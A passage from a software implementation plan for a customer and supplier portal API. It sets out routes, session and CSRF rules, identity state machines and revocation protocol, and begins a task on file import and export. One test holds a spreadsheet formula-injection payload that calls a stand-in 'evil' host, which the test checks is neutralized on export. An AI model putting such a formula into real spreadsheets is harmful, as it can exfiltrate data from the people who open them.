| method | path | operationId | server-derived audience binding |
|---|---|---|---|
| `POST` | `/portal/v1/invitations/{invite_id}/accept` | `acceptPortalInvitation` | `BOOTSTRAP_INVITE_BOUND` |
| `POST` | `/portal/v1/sessions/start` | `startPortalSession` | `BOOTSTRAP_BINDING_BOUND` |
| `POST` | `/portal/v1/sessions/renew` | `renewPortalSession` | `SESSION_BINDING_BOUND` |
| `POST` | `/portal/v1/sessions/end` | `endPortalSession` | `SESSION_BINDING_BOUND` |
| `POST` | `/portal/v1/recovery/start` | `startPortalRecovery` | `BOOTSTRAP_BINDING_BOUND` |
| `POST` | `/portal/v1/recovery/prove` | `provePortalRecovery` | `BOOTSTRAP_BINDING_BOUND` |
| `POST` | `/portal/v1/recovery/complete` | `completePortalRecovery` | `BOOTSTRAP_BINDING_BOUND` |
| `POST` | `/portal/v1/authenticators/register` | `registerPortalAuthenticator` | `SESSION_BINDING_BOUND` |
| `POST` | `/portal/v1/authenticators/revoke` | `revokePortalAuthenticator` | `SESSION_BINDING_BOUND` |
| `POST` | `/portal/v1/devices/register` | `registerPortalDevice` | `SESSION_BINDING_BOUND` |
| `POST` | `/portal/v1/devices/revoke` | `revokePortalDevice` | `SESSION_BINDING_BOUND` |
| `POST` | `/portal/v1/commands` | `submitPortalCommand` | discriminator-row audience |
| `POST` | `/portal/v1/queries` | `executePortalQuery` | discriminator-row audience |
| `GET` | `/portal/v1/commands/{request_id}` | `getPortalCommandReceipt` | original-command binding |
| `POST` | `/portal/v1/files/upload-sessions` | `createPortalFileUploadSession` | `SESSION_BINDING_BOUND` |
| `GET` | `/portal/v1/files/upload-sessions/{upload_id}` | `getPortalFileUploadSession` | `SESSION_BINDING_BOUND` |
| `PUT` | `/portal/v1/files/upload-sessions/{upload_id}/chunks/{chunk_no}` | `putPortalFileUploadChunk` | `SESSION_BINDING_BOUND` |
| `POST` | `/portal/v1/files/upload-sessions/{upload_id}/complete` | `completePortalFileUploadSession` | `SESSION_BINDING_BOUND` |
| `GET` | `/portal/v1/files/{object_id}/versions/{version_id}` | `getPortalFileVersion` | `SESSION_BINDING_BOUND` |

The non-generic operations also have one exact schema triple: invitation accept uses `AcceptPortalInvitationRequestV1/PortalCredentialActivationReceiptV1/PortalInvitationAcceptErrorsV1`; session start、renew、end use respectively `PortalSessionStartRequestV1/PortalSessionStartedV1/PortalSessionStartErrorsV1`、`PortalSessionRenewRequestV1/PortalSessionRenewedV1/PortalSessionRenewErrorsV1` and `PortalSessionEndRequestV1/PortalSessionEndedV1/PortalSessionEndErrorsV1`; recovery start、prove、complete use `PortalRecoveryStartRequestV1/PortalRecoveryChallengeV1/PortalRecoveryStartErrorsV1`、`PortalRecoveryProveRequestV1/PortalRecoveryProofAcceptedV1/PortalRecoveryProveErrorsV1` and `PortalRecoveryCompleteRequestV1/PortalRecoveryCompletedV1/PortalRecoveryCompleteErrorsV1`; authenticator register/revoke use `PortalAuthenticatorRegisterRequestV1/PortalAuthenticatorChangedV1/PortalAuthenticatorRegisterErrorsV1` and `PortalAuthenticatorRevokeRequestV1/PortalAuthenticatorChangedV1/PortalAuthenticatorRevokeErrorsV1`; device register/revoke use `PortalDeviceRegisterRequestV1/PortalDeviceChangedV1/PortalDeviceRegisterErrorsV1` and `PortalDeviceRevokeRequestV1/PortalDeviceChangedV1/PortalDeviceRevokeErrorsV1`. The five file operations reuse the exact Task 1 profiles `CreateUploadSessionRequestV1/UploadSessionCreatedV1`、`UploadSessionStatusV1`、raw bounded chunk plus `UploadChunkAcceptedV1`、`CompleteUploadSessionRequestV1/FileIngressAcceptedV1` and `PublishedFileVersionV1`, wrapped in portal-specific audience/session/CSRF error unions；the receipt GET returns the original typed `PortalCommandResultV1` or strict `PortalCommandPendingV1`, never a generic map.

These strict request fields are frozen: `AcceptPortalInvitationRequestV1={request_id,idempotency_key,expected_invite_version,channel_proof,mfa_proof,device_attestation,password_registration,terms_acceptance}`；`PortalSessionStartRequestV1={request_id,login_hint,password_proof,mfa_proof,device_proof}`；renew/end are `{request_id,refresh_proof,device_proof}` and `{request_id,reason}`；recovery start/prove/complete are `{request_id,login_hint,channel_kind,device_public_key}`、`{request_id,recovery_id,challenge_proof}` and `{request_id,recovery_id,recovery_proof,new_authenticator_registration,new_device_attestation,expected_binding_version}`；authenticator register/revoke are `{request_id,authenticator_kind,challenge_proof,attestation}` and `{request_id,authenticator_id,expected_authenticator_version,reason}`；device register/revoke are `{request_id,device_public_key,attestation,challenge_proof}` and `{request_id,device_id,expected_device_version,reason}`. Each nested proof/attestation/registration is a named strict oneOf with bounded canonical bytes/digests and no raw secret/private key；client-supplied principal/binding/audience/legal-entity/party/contact/session/capability/policy fields are rejected. Result components enumerate IDs、state、version、expiry/generation/audit refs only and never return password、challenge、refresh credential or authenticator secret bytes.

There are no other portal methods/paths, second verbs, aliases, templated upstream destinations or generic `/api/v1/*` forwarding routes. Audience is resolved from a verified invite/bootstrap/session/binding or the fixed discriminator row；the JSON body never contains audience. Every operation uses one typed request/result/error union, carries `x-f57-owner-task: F57-22`, and the contract test rejects any missing/extra row, wrong operationId or dual-audience discriminator.

The sole machine Portal discriminator registry is the seed slice whose `owner_task=F57-22` and `introduced_version=1.0.0-f57`: exactly ten commands and eleven queries, with cumulative Portal 1.0 count `10/11` and exact `x-planned-implementation-tasks: [F57-22]`. The following table is a human-readable rendering of those same 21 rows, not an independent registry; every audience、literal、payload/result/error `$ref` and CAS cell must exact-equal the seed, and OpenAPI、Rust Task 6 and generated TypeScript must have no missing or extra row:

| kind | audience | wire literal | Rust variant | strict payload `$ref` | strict value `$ref` | exact error-set `$ref` | subject CAS |
|---|---|---|---|---|---|---|---|
| command | `CUSTOMER_PORTAL` | `customer.delivery.confirm` | `ConfirmDelivery` | `ConfirmDeliveryRequestV1` | `DeliveryConfirmedV1` | `PortalCustomerDeliveryConfirmErrorsV1` | `MUTATE_POSITIVE` |
| command | `CUSTOMER_PORTAL` | `customer.acceptance.submit` | `SubmitAcceptance` | `SubmitAcceptanceRequestV1` | `AcceptanceSubmittedV1` | `PortalCustomerAcceptanceSubmitErrorsV1` | `MUTATE_POSITIVE` |
| command | `CUSTOMER_PORTAL` | `customer.complaint.create` | `CreateComplaint` | `CreateComplaintRequestV1` | `ComplaintAcceptedV1` | `PortalCustomerComplaintCreateErrorsV1` | `CREATE_ZERO` |
| command | `CUSTOMER_PORTAL` | `customer.service_request.create` | `CreateServiceRequest` | `CreateServiceRequestV1` | `ServiceRequestAcceptedV1` | `PortalCustomerServiceRequestCreateErrorsV1` | `CREATE_ZERO` |
| command | `CUSTOMER_PORTAL` | `customer.service_evidence.add` | `AddServiceEvidence` | `AddServiceEvidenceRequestV1` | `ServiceEvidenceAcceptedV1` | `PortalCustomerServiceEvidenceAddErrorsV1` | `MUTATE_POSITIVE` |
| command | `SUPPLIER_PORTAL` | `supplier.purchase_order.confirm` | `ConfirmPurchaseOrder` | `ConfirmPurchaseOrderRequestV1` | `PurchaseOrderConfirmedV1` | `PortalSupplierPurchaseOrderConfirmErrorsV1` | `MUTATE_POSITIVE` |
| command | `SUPPLIER_PORTAL` | `supplier.delivery_date.confirm` | `ConfirmDeliveryDate` | `ConfirmDeliveryDateRequestV1` | `DeliveryDateConfirmedV1` | `PortalSupplierDeliveryDateConfirmErrorsV1` | `MUTATE_POSITIVE` |
| command | `SUPPLIER_PORTAL` | `supplier.asn.submit` | `SubmitAdvanceShippingNotice` | `SubmitAdvanceShippingNoticeRequestV1` | `AdvanceShippingNoticeAcceptedV1` | `PortalSupplierAsnSubmitErrorsV1` | `CREATE_ZERO` |
| command | `SUPPLIER_PORTAL` | `supplier.invoice.upload` | `UploadInvoice` | `UploadSupplierInvoiceRequestV1` | `SupplierInvoiceUploadAcceptedV1` | `PortalSupplierInvoiceUploadErrorsV1` | `CREATE_ZERO` |
| command | `SUPPLIER_PORTAL` | `supplier.profile.update` | `UpdateOwnProfile` | `UpdateOwnSupplierProfileRequestV1` | `SupplierProfileChangeAcceptedV1` | `PortalSupplierProfileUpdateErrorsV1` | `MUTATE_POSITIVE` |
| query | `CUSTOMER_PORTAL` | `customer.quote.get` | `Quote` | `CustomerQuoteGetQueryV1` | `CustomerQuoteViewV1` | `PortalCustomerQuoteGetErrorsV1` | `QUERY_NONE` |
| query | `CUSTOMER_PORTAL` | `customer.contract.get` | `Contract` | `CustomerContractGetQueryV1` | `CustomerContractViewV1` | `PortalCustomerContractGetErrorsV1` | `QUERY_NONE` |
| query | `CUSTOMER_PORTAL` | `customer.order.get` | `Order` | `CustomerOrderGetQueryV1` | `CustomerOrderViewV1` | `PortalCustomerOrderGetErrorsV1` | `QUERY_NONE` |
| query | `CUSTOMER_PORTAL` | `customer.delivery.get` | `Delivery` | `CustomerDeliveryGetQueryV1` | `CustomerDeliveryViewV1` | `PortalCustomerDeliveryGetErrorsV1` | `QUERY_NONE` |
| query | `CUSTOMER_PORTAL` | `customer.invoice.get` | `Invoice` | `CustomerInvoiceGetQueryV1` | `CustomerInvoiceViewV1` | `PortalCustomerInvoiceGetErrorsV1` | `QUERY_NONE` |
| query | `CUSTOMER_PORTAL` | `customer.receipt.get` | `Receipt` | `CustomerReceiptGetQueryV1` | `CustomerReceiptViewV1` | `PortalCustomerReceiptGetErrorsV1` | `QUERY_NONE` |
| query | `CUSTOMER_PORTAL` | `customer.equipment.get` | `Equipment` | `CustomerEquipmentGetQueryV1` | `CustomerEquipmentViewV1` | `PortalCustomerEquipmentGetErrorsV1` | `QUERY_NONE` |
| query | `CUSTOMER_PORTAL` | `customer.work_order.get` | `WorkOrder` | `CustomerWorkOrderGetQueryV1` | `CustomerWorkOrderViewV1` | `PortalCustomerWorkOrderGetErrorsV1` | `QUERY_NONE` |
| query | `CUSTOMER_PORTAL` | `customer.approved_document.get` | `ApprovedDocument` | `CustomerApprovedDocumentGetQueryV1` | `CustomerApprovedDocumentViewV1` | `PortalCustomerApprovedDocumentGetErrorsV1` | `QUERY_NONE` |
| query | `SUPPLIER_PORTAL` | `supplier.purchase_order.get` | `PurchaseOrder` | `SupplierPurchaseOrderGetQueryV1` | `SupplierPurchaseOrderViewV1` | `PortalSupplierPurchaseOrderGetErrorsV1` | `QUERY_NONE` |
| query | `SUPPLIER_PORTAL` | `supplier.reconciliation_statement.get` | `ReconciliationStatement` | `SupplierReconciliationStatementGetQueryV1` | `SupplierReconciliationStatementViewV1` | `PortalSupplierReconciliationStatementGetErrorsV1` | `QUERY_NONE` |

Every command/query `$ref` is a distinct JSON Schema 2020-12 object with `additionalProperties:false`; get queries accept only their named object ID, while reconciliation statement additionally accepts exact `{period_from,period_to}`. They never accept actor/principal、binding、audience、legal entity、party/contact、device/session or arbitrary filter/sort. Each error component equals the Task 1 portal-command or portal-query shared exact set plus the row's non-`NONE` operation error；all Task 22 rows are explicitly `NONE`, so no extra domain code is invented. Query sets contain no idempotency/concurrency error and command sets do. All eleven seed columns are exact-compared across OpenAPI、Rust、generated TypeScript and Task 6 registration.

The five file routes are part of Task 22—not a later amendment—because `AddServiceEvidence` and `UploadInvoice` cannot activate without byte ingress. They reuse Task 1's exact asynchronous quarantine→scan→publish profiles through the core portal adapter and file owner; the SQL-free gateway only streams bounded bytes under an audience/binding/legal-entity/object-scoped upload handle. Completion never blocks on scanning and returns only `FileIngressAcceptedV1` in QUARANTINED；the client polls the exact `status_path` with server `Retry-After` plus capped exponential backoff/jitter until the strict status oneOf reaches PUBLISHED or REJECTED. Only PUBLISHED contains `PublishedAttachmentRefV1`; commands accept that exact ref and reject ingest/upload IDs、bare object/latest IDs、quarantined/scanning/rejected or replaced versions. POR-001/POR-002 POST_GREEN tests must exercise upload, nonblocking completion, every status branch, malware/stale-scanner rejection, cross-binding isolation and the subsequent typed command in the same Task 22 gate.

`PortalCommandV1` exact fields are `{request_id,command_type,idempotency_key,expected_generation,expected_subject_version,payload}`；`PortalQueryV1` exact fields are `{request_id,query_type,generation,payload}`；`PortalCommandResultV1<T>` exact fields are `{correlation_id,authoritative_generation,subject_version,audit_entry_id,value}`；`PortalQueryResultV1<T>` exact fields are `{correlation_id,authoritative_generation,value,next_cursor}`；and `PortalErrorV1` exact fields are `{correlation_id,error_code,message_key,retryable,field_errors,authoritative_generation}`. Every object and typed payload has `additionalProperties:false`. `expected_subject_version` is the sole command subject CAS：registry mode `CREATE_ZERO` requires integer `0`; `MUTATE_POSITIVE` requires a positive current aggregate version; payloads may not contain `expected_version|expected_row_version|base_version`. Invite acceptance is not a `PortalCommandV1` variant；its dedicated `AcceptPortalInvitationRequestV1` contains a positive `expected_invite_version` and strict bootstrap proofs, so the generic command envelope has no null/version exception. Actor/principal、binding、audience、legal entity、party/contact、device/session、capabilities、MFA/reauth、policy and authority epoch are rebuilt from the verified server session/bootstrap context and are forbidden in JSON.

Normal mutating routes require the `__Host-ep_portal_session` Secure/HttpOnly/SameSite=Strict cookie plus an exact `X-Portal-CSRF` proof bound server-side to session, audience, origin and request ID. Invite acceptance is the only pre-session bootstrap: it uses a short-lived `__Host-ep_portal_bootstrap` Secure/HttpOnly/SameSite=Strict cookie plus single-use `X-Portal-CSRF`, invite/channel/MFA/device proofs in the strict body, and creates the real cookie only after the atomic Task 5 transaction commits. Tokens/proofs never enter URL, localStorage, response logs or generic command payloads. Contract tests cover missing/mismatched/replayed CSRF, changed payload under the same idempotency key, wrong expected generation/version, cookie/audience/origin swap, forged authority fields and invite/bootstrap proof replay without existence disclosure.

`docs/openapi/portal.v1.yaml` is rebaselined in this task from an F-50 affected-path input into the complete exact F-57 portal contract and must declare exact `info.title: Enterprise Platform Portal API`、`info.version: 1.0.0-f57`、`x-f57-status: CURRENT`、`x-source-authority: F57_TASK_22`、`x-planned-implementation-tasks: [F57-22]` and `x-implementation-state: IMPLEMENTED`。It models only the customer/supplier query and command allowlists above, the five exact file routes, and Business §10 invite/session/authenticator/device/recovery flows, with strict audience-bound envelopes and stable non-enumerating errors；all objects use `additionalProperties:false`，there is no generic object proxy, direct core/database route, bare-latest file route or supplier “accept invoice” endpoint. `docs/openapi/README.md` and the authority/supersession register change the portal entry atomically to current/implemented in the same commit; README is the machine-exact metadata registry and the authority register remains the semantic authority/status mapping.

Implement Business Execution Contract §10 as coordinated exact state machines over the Task 5 store, never as one linear account lifecycle. Invite edges are exactly `ISSUED→ACCEPTED|EXPIRED|REVOKED` and all three successors are terminal. Principal edges are exactly `PENDING_ACTIVATION→ACTIVE|REVOKED`、`ACTIVE→SUSPENDED|REVOKED`、`SUSPENDED→ACTIVE|REVOKED`; binding edges are exactly `PENDING_APPROVAL→ACTIVE|ENDED`、`ACTIVE→SUSPENDED|ENDED`、`SUSPENDED→ACTIVE|ENDED`. Authenticator/device edges are exactly `PENDING_VERIFICATION→ACTIVE|REVOKED|EXPIRED` and `ACTIVE→REVOKED|EXPIRED`; session edges are exactly `ACTIVE→CLOSED|REVOKED|EXPIRED`. Every unlisted edge is rejected and every terminal is immutable. A principal that has never been ACTIVE remains `PENDING_ACTIVATION` when its first/all pending bindings end; only a previously ACTIVE principal without a healthy active binding aggregates to `SUSPENDED`, so no hidden principal edge is invented. Customer and supplier users share the same `PortalPartyBinding` model, but every binding is audience-bound to exactly one `CUSTOMER_PORTAL` or `SUPPLIER_PORTAL`, one legal entity, one customer/supplier party and one current contact relationship; the two audiences never share a binding, session, device credential or authorization projection. One principal may hold multiple bindings, but each request selects and reauthorizes exactly one ACTIVE binding.

Freeze `AcceptPortalInvite` as the sole first-activation bootstrap operation on the dedicated invitation route. After interactive channel/TOTP/WebAuthn proof is converted to a short-lived single-use invite/binding/device-bound proof, consume that proof with a non-rollback CAS before authority mutation; a failed attempt requires a fresh challenge but changes no portal domain state. One serializable authority transaction then validates invite/relationship/password/MFA/terms and the consumed proof digest, activates the binding-scoped password and MFA authenticators, activates binding and recomputes principal, activates the first device, creates the first ACTIVE session/refresh family, accepts the invite and writes audit plus exactly one Business §10.3 `PortalCredentialActivationReceiptV1`. The OpenAPI schema and Rust/SQL model must expose its exact fields and reject revocation-receipt substitution, extra fields, cross-binding IDs or secret material. Any failure rolls back all domain/session/activation-receipt writes, leaves the invite ISSUED and exposes no partial state. Only a retry carrying the same `request_id`/idempotency key and same principal/binding/device, after response loss and while still authorized, may resolve through the command-receipt store to the existing activation receipt reference；`request_id` is the sole portal command identity and there is no wire `command_id` alias. Reusing an invite token or channel/MFA proof always returns the stable non-enumerating replay error, exposes no receipt/principal/binding existence and creates nothing. Invite expiry/revocation, party merge/termination and security batch revocation also move PENDING_VERIFICATION authenticator/device rows to REVOKED.

Implement Business §10.5's two-transaction fail-closed revocation protocol, not an impossible “rollback but still suspended” transaction. `BeginPortalSecurityFence` first commits the exact `PortalSecurityFenceV1`, reason-mapped binding_targets, target principal state and authority epoch+1. Implement the exact `PortalFenceReason` table: binding temporary/reuse/clone reasons only suspend the target binding；relationship end/merge/permanent binding reasons end only that binding；principal suspected compromise requires a previously ACTIVE principal, suspends active bindings, ends pending bindings and yields principal SUSPENDED；the three permanent fraud/legal/global reasons end every nonterminal binding and atomically set principal REVOKED. Unknown or mismatched reason/scope/targets fail. Gateway/session/refresh checks deny old epoch and any unfinalized fence. Only then may idempotent `FinalizePortalCredentialRevocation` revoke all ACTIVE/PENDING credentials and write exactly one strict `PortalCredentialRevocationReceiptV1` per fenced `(binding_id,audience)` with the same fence_id/audit_ref/reason/generation/revoked_at. Finalization rollback leaves the first fence durable and access denied; retry must produce the exact receipt set once. The OpenAPI, DB constraints and `T-F57-POR-003` cover every reason mapping and illegal combination, permanent principal atomic REVOKED, crash after fence, partial sweep rollback, gateway denial, retry, cross-binding receipt and receipt-set mismatch. Implement the exact 15-minute access、30-minute idle、8-hour absolute session/refresh、90-day device、10-minute high-risk MFA freshness、three-device and three-session limits；refresh reuse invokes this fence protocol for the affected binding and writes exactly one durable `PortalCredentialReuseDetectedV1` outbox fact with strict fields `{event_id,fence_id,principal_id,binding_id,audience,legal_entity_id,device_id,session_id,refresh_family_id,observed_rotation_no,credential_digest,detected_at,generation,audit_ref}`—never raw credential bytes—for Task 24 exact-once incident intake. Recovery is a command/evidence sequence while the affected binding remains `SUSPENDED`; principal state follows Business §10.3 aggregation and therefore remains ACTIVE when another healthy binding is active, but is SUSPENDED for a global compromise or when no healthy binding remains. Independently approve recovery, require finalized credential cleanup, verify the current contact channel and party relationship, create the new binding-scoped authenticator, then return the binding to ACTIVE or terminate it as ENDED；principal-level fraud/legal revocation is REVOKED and terminal. Do not add `RECOVERY_PENDING` or any other state. Invite replay/expiry, contact departure, relationship termination, party merge, suspected compromise, recovery and administrator revocation use the same scoped fence without changing other valid bindings unless the incident is explicitly principal-wide. The full Business §10.6 identity/isolation/session matrix—including every Invite/authenticator/device/session edge, atomic `AcceptPortalInvite`, one activation receipt, pending-item revocation, fence/reason/sweep crash recovery, principal-wide per-binding revocation receipts and never-activated principal aggregation—is bound to `T-F57-POR-003` in `testkit/tests/f57_portal_customization.rs`; no cross-customer, cross-supplier, cross-audience, cross-legal-entity existence or aggregate side channel may remain.

- [ ] **Step 4: Implement minimum complete customization scope**

```rust
pub struct UiSchemaV1 {
    pub objects: Vec<ObjectView>,
    pub forms: Vec<FormSchema>,
    pub lists: Vec<ListSchema>,
    pub menus: Vec<MenuSchema>,
    pub dashboards: Vec<DashboardSchema>,
    pub print_templates: Vec<PrintTemplateSchema>,
    pub capability_requirements: Vec<CapabilityId>,
}
```

The current product certifies customer-created relational objects, fields and relations plus forms, lists, menus, task views, dashboards, reports, print templates, automation definitions and GOV-006 name/icon/colour/package/print branding. Every item compiles into Task 9 generations and Task 10 signed migration/impact plans; there is no arbitrary JavaScript, SQL, CSS injection or client-only permission rule. Branding assets are signed, content-scanned and rollbackable as one generation.

- [ ] **Step 5: Run portal and generation tests**

Run: `cargo test -p ep-domain-portal -p ep-platform-meta -p ep-adapter-db-pg -p core-server -p portal-gateway && cargo test -p ep-testkit --test f57_portal_isolation --test f57_customization_generation --test f57_branding_generation --test f57_portal_customization && npm --prefix clients/portal ci && npm --prefix clients/portal test -- --run && npm --prefix clients/portal run build && cargo xtask scan-web-assets clients/portal/dist && cargo xtask archcheck && cargo xtask sqlcheck && cargo xtask f57check --task F57-22 --phase post-green`

Expected: PASS for cross-party isolation, stale generation, malicious schema, package disable/data retention, template rollback and WCAG AA；fresh-PG portal state/restart/concurrency cases pass, every portal write is observed through the one CommandPipeline, and the SQL-free gateway cannot call a repository or arbitrary upstream route.

- [ ] **Step 6: Commit**

```bash
git add -- crates/contract/portal/src/lib.rs crates/domain/portal/src/lib.rs crates/application/portal/src/lib.rs apps/portal-gateway/src/main.rs apps/portal-gateway/src/session.rs apps/portal-gateway/src/upstream.rs
git add -- crates/platform/identity/src/portal_identity.rs crates/platform/identity/src/ports.rs crates/platform/identity/src/lib.rs crates/platform/identity/Cargo.toml crates/adapter/db-pg/src/portal/repository.rs crates/adapter/db-pg/src/portal/identity_repository.rs
git add -- crates/adapter/db-pg/src/portal/portal_identity_repository.rs crates/adapter/db-pg/src/portal/mod.rs crates/adapter/db-pg/src/lib.rs crates/adapter/db-pg/Cargo.toml apps/core-server/src/platform/portal.rs apps/core-server/src/platform/mod.rs
git add -- apps/core-server/src/business.rs apps/core-server/src/wiring/business.rs apps/core-server/src/wiring/command.rs apps/core-server/src/lib.rs apps/core-server/Cargo.toml docs/superpowers/reviews/2026-08-23-f57-authority-supersession-register.md
git add -- apps/portal-gateway/src/identity_lifecycle.rs apps/portal-gateway/Cargo.toml clients/portal/package.json clients/portal/package-lock.json clients/portal/tsconfig.json clients/portal/index.html
git add -- clients/portal/vite.config.ts clients/portal/vitest.config.ts clients/portal/src/main.tsx clients/portal/src/test/setup.ts clients/portal/src/App.test.tsx clients/portal/src/App.tsx clients/portal/src/api/portal.ts
git add -- clients/portal/src/customer/CustomerHome.tsx clients/portal/src/supplier/SupplierHome.tsx crates/platform/meta/src/ui_schema.rs crates/platform/meta/src/dashboard.rs crates/platform/meta/src/template.rs crates/platform/meta/src/branding.rs
git add -- crates/platform/meta/src/lib.rs crates/platform/meta/Cargo.toml testkit/tests/f57_portal_isolation.rs testkit/tests/f57_customization_generation.rs testkit/tests/f57_branding_generation.rs testkit/tests/f57_portal_customization.rs
git add -- docs/openapi/portal.v1.yaml docs/openapi/README.md
git add -- testkit/Cargo.toml
git commit -m "feat: add governed portals and customization"
```

### Task 23: Add secure files, approvals, search, Excel/document exchange, identity and connectors

**Files:**
- Existing authoritative input: `docs/superpowers/specs/2026-08-23-f57-client-lifecycle-security-contract.md`
- Existing authoritative input: `docs/f57-api-discriminators.seed.tsv`
- Existing authoritative input: `docs/f57-api-component-shapes.seed.tsv`
- Existing authoritative input: `docs/f57-api-component-state-domains.seed.tsv`
- Existing authoritative input: `docs/f57-api-state-domains.seed.tsv`
- Existing authoritative input: `docs/f57-api-direct-routes.seed.tsv`
- Modify: `docs/openapi/control-center.v1.yaml`
- Modify: `docs/openapi/employee-api.v1.yaml`
- Modify: `docs/openapi/README.md`
- Modify: `docs/superpowers/reviews/2026-08-23-f57-authority-supersession-register.md`
- Modify: `docs/data-dictionary/platform_flow.md`
- Modify: `docs/event-catalog.md`
- Modify: `docs/metrics-catalog.md`
- Modify: `crates/foundation/src/port/malware.rs`
- Modify: `crates/foundation/src/port/mod.rs`
- Modify: `crates/foundation/src/lib.rs`
- Modify: `crates/adapter/doc/src/lib.rs`
- Modify: `crates/adapter/doc/Cargo.toml`
- Modify: `crates/adapter/file/src/lib.rs`
- Modify: `crates/adapter/file/src/quarantine.rs`
- Modify: `crates/adapter/file/src/scanner.rs`
- Modify: `crates/adapter/file/src/publisher.rs`
- Modify: `crates/adapter/file/Cargo.toml`
- Modify: `crates/adapter/windows-malware/Cargo.toml`
- Modify: `crates/adapter/windows-malware/src/lib.rs`
- Modify: `crates/adapter/windows-malware/src/defender.rs`
- Modify: `crates/adapter/windows-malware/src/amsi.rs`
- Modify: `crates/adapter/windows-malware/tests/verdict.rs`
- Modify: `crates/adapter/search/src/lib.rs`
- Modify: `crates/adapter/search/Cargo.toml`
- Modify: `crates/platform/file/src/scan.rs`
- Modify: `crates/platform/file/src/scanner.rs`
- Create: `crates/platform/file/src/lifecycle.rs`
- Create: `crates/platform/file/src/legal_hold.rs`
- Create: `crates/platform/file/src/disposition.rs`
- Modify: `crates/platform/file/src/upload.rs`
- Modify: `crates/platform/file/src/lib.rs`
- Modify: `crates/platform/file/Cargo.toml`
- Create: `crates/platform/approval/Cargo.toml`
- Create: `crates/platform/approval/src/lib.rs`
- Create: `crates/platform/approval/src/case.rs`
- Create: `crates/platform/approval/src/policy.rs`
- Create: `crates/platform/search/Cargo.toml`
- Create: `crates/platform/search/src/lib.rs`
- Create: `crates/platform/search/src/definition.rs`
- Create: `crates/platform/search/src/query.rs`
- Modify: `crates/platform/identity/src/ports.rs`
- Create: `crates/platform/identity/src/external.rs`
- Modify: `crates/platform/identity/src/lib.rs`
- Modify: `crates/platform/identity/Cargo.toml`
- Create: `crates/platform/notify/src/provider.rs`
- Modify: `crates/platform/notify/src/lib.rs`
- Modify: `crates/platform/notify/Cargo.toml`
- Create: `crates/platform/import-export/Cargo.toml`
- Create: `crates/platform/import-export/src/lib.rs`
- Create: `crates/platform/import-export/src/excel.rs`
- Create: `crates/platform/import-export/src/csv.rs`
- Create: `crates/platform/import-export/src/export.rs`
- Create: `crates/platform/import-export/src/portable_v1.rs`
- Create: `crates/platform/import-export/src/provider_codec.rs`
- Create: `crates/platform/import-export/tests/formula_injection.rs`
- Modify: `Cargo.toml`
- Modify: `crates/adapter/db-pg/src/platform_file/mod.rs`
- Modify: `crates/adapter/db-pg/src/platform_file/objects.rs`
- Create: `crates/adapter/db-pg/src/platform_file/governed_lifecycle.rs`
- Create: `crates/adapter/db-pg/src/platform_flow/approval_cases.rs`
- Create: `crates/adapter/db-pg/src/platform_core/external_identity_links.rs`
- Create: `crates/adapter/db-pg/src/platform_meta/search_definitions.rs`
- Modify: `crates/adapter/db-pg/src/platform_flow/mod.rs`
- Modify: `crates/adapter/db-pg/src/platform_core/mod.rs`
- Modify: `crates/adapter/db-pg/src/platform_meta/mod.rs`
- Modify: `crates/adapter/db-pg/src/lib.rs`
- Modify: `crates/adapter/db-pg/Cargo.toml`
- Create: `db/migrations/platform_file/V20261025093100__platform_file_extend_governed_lifecycle.sql`
- Create: `db/migrations/platform_flow/V20261025093200__platform_flow_create_approval_cases.sql`
- Create: `db/migrations/platform_core/V20261025093300__platform_core_create_external_identity_links.sql`
- Create: `db/migrations/platform_meta/V20261025093400__platform_meta_create_search_definitions.sql`
- Create: `apps/integration-gateway/src/providers/mod.rs`
- Create: `apps/integration-gateway/src/providers/smtp.rs`
- Create: `apps/integration-gateway/src/providers/webhook.rs`
- Create: `apps/integration-gateway/src/providers/ad_ldap.rs`
- Create: `apps/integration-gateway/src/providers/oidc_saml.rs`
- Create: `apps/integration-gateway/src/providers/icap.rs`
- Modify: `apps/integration-gateway/src/main.rs`
- Modify: `apps/integration-gateway/src/wiring/mod.rs`
- Modify: `apps/integration-gateway/Cargo.toml`
- Create: `apps/core-server/src/platform/common_services.rs`
- Modify: `apps/core-server/src/platform/control_center.rs`
- Modify: `apps/core-server/src/platform/employee_api.rs`
- Modify: `apps/core-server/src/platform/mod.rs`
- Modify: `apps/core-server/src/wiring/business.rs`
- Modify: `apps/core-server/Cargo.toml`
- Modify: `clients/control-center/src/api/authority.ts`
- Modify: `clients/workbench/src/api/employee.ts`
- Create: `testkit/tests/f57_import_export.rs`
- Create: `testkit/tests/f57_identity_provider.rs`
- Modify: `testkit/tests/f57_file_quarantine.rs`
- Create: `testkit/tests/f57_approval_search.rs`
- Create: `testkit/tests/f57_platform_connectors_lifecycle.rs`
- Modify: `testkit/tests/f57_control_center_contract.rs`
- Modify: `testkit/tests/f57_workbench_contract.rs`
- Modify: `testkit/Cargo.toml`
- Test manifest: every exact row whose `activation_task=F57-23`，including cross-owner `INT-003` and `MDM-006` plus the PLT/INT/IDP/SEC/GOV/DEF rows assigned by the immutable seed

**Interfaces:**
- Consumes: Task 6 command bus, Task 8 capabilities, Task 12 effects, Task 14 providers, Tasks 19–22 business/public projections and the immutable API discriminator seed.
- Produces: secure file lifecycle, reusable approval cases, governed PostgreSQL search definitions, `ImportProposal`, portable export, local emergency identity, certified AD/LDAP and package seams for OIDC/SAML/vendor connectors.

- [ ] **Step 1: Write failing import-security and identity-fallback tests**

```rust
#[test]
fn spreadsheet_formula_payload_is_neutralized_on_export() {
    let cell = export_cell("=WEBSERVICE(\"https://evil\")");
    assert_eq!(cell.kind, CellKind::LiteralText);
    assert_eq!(cell.value, "'=WEBSERVICE(\"https://evil\")");
}

#[tokio::test]
async fn external_identity_outage_does_not_remove_local_breakglass() {
    let system = identity_system().ad_ldap_down();
    assert!(system.login_external("alice").await.is_err());
    assert!(system.login_breakglass(two_person_evidence()).await.is_ok());
}

#[tokio::test]
async fn skipped_or_stale_scan_never_publishes() {
    for outcome in [ScanOutcome::Skipped, ScanOutcome::Unavailable, ScanOutcome::Timeout,
                    ScanOutcome::Unknown, ScanOutcome::StaleDefinitions] {
        assert_eq!(upload_with(outcome).await.state, FileState::Quarantine);
    }
}

#[tokio::test]
async fn definition_age_boundary_is_exact() {
    assert_eq!(upload_with_definition_age(hours(72)).await.state, FileState::Published);
    assert_eq!(upload_with_definition_age(hours(72) + tick()).await.state, FileState::Quarantine);
}
```

- [ ] **Step 2: Confirm failure**

Run: `cargo xtask f57check --task F57-23 --phase pre-red && cargo test -p ep-platform-import-export && cargo test -p ep-testkit --test f57_identity_provider --test f57_file_quarantine`

Expected: FAIL because import/export and external identity adapters are absent.

- [ ] **Step 3: Implement proposal-based import and portable export**

```rust
